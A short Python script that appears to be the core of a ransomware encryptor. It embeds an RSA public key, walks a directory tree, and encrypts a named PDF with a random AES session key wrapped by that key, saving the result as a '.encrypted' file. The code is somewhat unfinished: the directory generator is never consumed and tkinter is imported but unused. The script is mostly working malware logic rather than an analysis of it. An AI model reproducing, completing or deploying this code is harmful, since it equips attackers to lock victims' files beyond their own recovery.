import base64
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk


# public key with base64 encoding
#pubKey='''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAofJgayBCsHlpp1pDSObacT+X6vBQxesCRo9UKUw/rMzH4r6RMDK8YvK8wY6P7E70P4Ha+1bH0zNG/YtJ+WF3WVeqNDAsYjN5tC9JvBmoZg/nyTYqjXTASS0bDEE1HMbdVHM4ZCeGgUXo9FmjCSTk5RjU5mlhi0zqoScwSK4jea2aiLfONiMJtmrfuhWr3hjaJ1+qEFjY3aylIum9b8anEe/PhOFHZWDphOKUEtXlAkdNatEA8TbSmcKec1uKvEfKefXjGf7sr016ISyHIjG91clP+3nKqV5w4tKz9rG3C8NdPAYgwskzEZuwGn1Neyff4oXbR4OSbqgJ5yY4a3LxKQIDAQAB'''
#pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey='''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwZaLqj2VxRWN/z+mj3Hr
m1bOrElusS5a2MxWcUci30T2K4tglAN4a4/AU+EeqDQlGMAa50KABZFmV6XkC15o
5nRHWH5JDw/05jvUrvJK7wLIuL3BnxBlu7JbmXchhkR2CIowGdN4PKTz5w9wX1gz
ZGkejQawDXyjjwhsXwOIjYYg1l6pxpP1cSMemIwhxa13Zg7r7iHPzr3DgKYVI5kj
QV7c6UjFOC9zoAbYyTd1NXXsCfY86uEcRbd/8zlcJuCW3S0Lp/EX0L0vy8jhRQ8o
8Dt7C/sIBBsO14p4lEJVhL19FphvuDIuOekhpQ29ol3bCseVGqi2quKsgHEJlKKh
3QIDAQAB'''
pubKey = base64.b64decode(pubKey)


path = '/D'

def scanRecurse(path):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(path):
        if entry.is_file():
            print(entry)
            yield entry
        else:
            yield from scanRecurse(entry.path)

scanRecurse(path)
def encrypt(dataFile, publicKey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    [ fileName, fileExtension ] = dataFile.split('.')
    encryptedFile = fileName  +'.'+ fileExtension + '.encrypted'
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    print('Encrypted file saved to ' + encryptedFile)

fileName = 'FontaineG-EURASIP07.pdf'
encrypt(fileName, pubKey)